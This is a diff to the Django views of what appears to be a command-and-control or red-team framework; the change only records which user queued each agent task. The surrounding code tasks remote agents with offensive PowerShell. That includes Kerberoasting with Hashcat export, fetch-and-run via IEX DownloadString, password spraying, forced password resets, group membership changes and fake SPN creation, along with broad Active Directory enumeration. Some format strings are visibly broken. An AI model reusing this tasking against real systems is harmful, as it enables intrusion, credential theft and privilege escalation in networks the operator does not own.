@@ -33,7 +33,8 @@ def SPNUsersforKerb(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Accounts for Kerb===============";import-module $env:USERPROFILE\powerview.ps1;Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName;echo "++++++++++++++++++`r`n"'
@@ -52,7 +53,8 @@ def EnumSMBShares(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         ip = request.POST['ip']
         username = request.POST['username']
@@ -91,7 +93,8 @@ def ACC_listing(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============useraccount list===============";wmic useraccount list /format:list;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -109,7 +112,8 @@ def Adapter(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============ipconfig /all===============";ipconfig /all;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -136,7 +140,8 @@ def ArpTable(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============arp -a===============";arp -a;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -155,7 +160,8 @@ def DefenseCheck(request, url='', outpath=''):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============FireWall===============";netsh advfirewall show allprofiles;echo "===============Windows Defender status===============";sc query windefend;echo "===============Antimalware status===============";Get-MpComputerStatus;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -174,7 +180,8 @@ def systeminfo(request, url='', outpath=''):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============systeminfo===============";systeminfo;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -192,7 +199,8 @@ def DomainInfo(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Get-ADDomain===============";Get-ADDomain;echo "++++++++++++++++++`r`n"'
         
@@ -211,7 +219,8 @@ def DomainUsers(request, domain=''):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============USERS===============";Get-ADUser -Filter * | select UserPrincipalName;echo "++++++++++++++++++`r`n"'.format(domain)
         
@@ -230,7 +239,8 @@ def DomainControllers(request, domain=''):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Domain Controllers===============";import-module $env:USERPROFILE\powerview.ps1;get-domaincontroller -domain {};echo "++++++++++++++++++`r`n"'.format(domain)
@@ -251,7 +261,8 @@ def EnvValue(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Environment values===============";Get-ChildItem Env: | ft Key,Value;echo "++++++++++++++++++`r`n"'       
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -269,7 +280,8 @@ def GroupsListing(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============group list===============";wmic group list /format:list;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -287,7 +299,8 @@ def Groups(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Get-ADGroup *===============";Get-ADGroup -Filter * | select name;echo "++++++++++++++++++`r`n"'
         
@@ -307,7 +320,8 @@ def groupInfo(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         group = request.POST['group']
         os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
@@ -339,7 +353,8 @@ def HotFixes(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Hot Fixes===============";wmic qfe get Caption,Description,HotFixID,InstalledOn;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -357,7 +372,8 @@ def Ip4Route(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============IPv4 routing table===============";route print -4;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -374,7 +390,8 @@ def ListExecPolicies(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Get-ExecutionPolicy===============";Get-ExecutionPolicy -List;echo "++++++++++++++++++`r`n"'       
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -392,7 +409,8 @@ def ListingModules(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Get-Module===============";Get-Module;echo "++++++++++++++++++`r`n"'
         
@@ -423,7 +441,8 @@ def loggedinUsers(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Logged-in users ===============";qwinsta;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -442,7 +461,8 @@ def LocalAccListing(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============System(local) accounts list===============";wmic sysaccount list /format:list;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -460,7 +480,8 @@ def TrustRelations(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============TrustRelationships===============";(New-Object Net.WebClient).DownloadFileAsync("https://raw.githubusercontent.com/samratashok/ADModule/master/Microsoft.ActiveDirectory.Management.dll", $env:USERPROFILE+"/Microsoft.ActiveDirectory.Management.dll");import-module $env:USERPROFILE\Microsoft.ActiveDirectory.Management.dll;Get-ADTrust -Filter *;echo "++++++++++++++++++`r`n"'
@@ -493,7 +514,8 @@ def Download_IWR(request, url='', outpath=''):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         task = '[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";iwr -UseBasicParsing {} -OutFile {}'.format(url, outpath)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -510,7 +532,8 @@ def DownloadFileAsync(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         url = request.POST['url']
         outpath = request.POST['outpath']
@@ -529,7 +552,8 @@ def DownloadString(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         url = request.POST['url']
         task = "IEX (New-Object Net.WebClient).DownloadString('{url}')".format(url)
@@ -548,7 +572,8 @@ def Download_SMB(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         url = request.POST['url']
         task = "copy \\{ip}:{port}\share\{fileName}".format(url)
@@ -566,7 +591,8 @@ def Download_FTP(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         ip = request.POST['ip']
         filename = request.POST['filename']
@@ -587,7 +613,8 @@ def open_pythonserver(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         timeout = request.POST['timeout']
         serverport = request.POST['serverport']
@@ -604,7 +631,8 @@ def open_SMBserver(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         timeout = request.POST['timeout']
         serverport = request.POST['serverport']
@@ -622,7 +650,8 @@ def open_FTPserver(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         timeout = request.POST['timeout']
         serverport = request.POST['serverport']
@@ -640,7 +669,8 @@ def open_PY_UploadServer(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         timeout = request.POST['timeout']
         serverport = request.POST['serverport']
@@ -658,7 +688,8 @@ def open_FTP_UploadServer(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         timeout = request.POST['timeout']
         serverport = request.POST['serverport']
@@ -676,7 +707,8 @@ def sharp(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         username = request.POST['username']
         password = request.POST['password']
@@ -694,7 +726,8 @@ def snaffler(request, url='', outpath=''):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Snaffler==============="\nOutPut in the following path:\n$env:USERPROFILE;.\$env:USERPROFILE\snaffler.exe -s -d {} -o $env:USERPROFILE\output.log -v data;echo "++++++++++++++++++`r`n"'.format(url, outpath)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -713,7 +746,8 @@ def DowngradePS(request):
         version = request.POST['version']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         task='powershell -version {}'.format(version)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -731,7 +765,8 @@ def processes(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Processes===============";wmic process list /format:list;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -750,7 +785,8 @@ def Dsquery(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============DSquery===============";dsquery {};echo "++++++++++++++++++`r`n"'.format(arg)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -778,7 +814,8 @@ def TGStickets_GetSPNusers(request):
         result_path = result_dir+"results"
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         if username != '':
             os.system("echo '===============TGS Tickets===============\nOutPut in the following path:\n{result_dir}' >> {result_path};python ../general/GetUserSPNs.py -dc-ip {DCip} {domain}/{username}:{password} -o {result_dir}TGStickets -request".format(result_dir,result_path,username,password,domain,DCip))
@@ -799,7 +836,8 @@ def TGStickets_powerview(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============TGStickets===============\nOutPut in the following path:\n$env:userprofile";import-module $env:userprofile\powerview.ps1;Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\$env:userprofile\[$env:username]TGS.csv -NoTypeInformation;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -864,7 +902,8 @@ def GPO_windapsearch(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         DCip = request.POST['DCip']
         username = request.POST['username']
@@ -891,7 +930,8 @@ def CME_pass_spray(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         DCip = request.POST['DCip']
         userslist = request.POST['userslist']
@@ -955,7 +995,8 @@ def InterestingACL_Enum(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Find-InterestingDomainAcl===============";import-module $env:userprofile\powerview.ps1;Find-InterestingDomainAcl;echo "++++++++++++++++++`r`n"'
@@ -975,7 +1016,8 @@ def SpecificACL_Enum_powerview(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         user = request.POST['user']
         os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
@@ -994,7 +1036,8 @@ def ReverseSearch_and_Mapping_GUID(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         guid = request.POST['guid']
         os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
@@ -1014,7 +1057,8 @@ def NestedGroups_of_a_Group(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         groupname = request.POST['groupname']
         os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
@@ -1033,7 +1077,8 @@ def forceChangePass_DomainUserPassword(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         contoleduser = request.POST['contoleduser']
         password = request.POST['password']
@@ -1055,7 +1100,8 @@ def AddGroupMember(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         user = request.POST['user']
         password = request.POST['password']
@@ -1076,7 +1122,8 @@ def RmGroupMember(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         user = request.POST['user']
         password = request.POST['password']
@@ -1097,7 +1144,8 @@ def CreateFake_SPN(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         user = request.POST['user']
         password = request.POST['password']
@@ -1118,7 +1166,8 @@ def UserGeneralInfo(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         user = request.POST['user']
         os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
@@ -1141,7 +1190,8 @@ def Enum_GroupMembers_on_machine(request):
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         groupName = request.POST['groupName']
         computerName = request.POST['computerName']
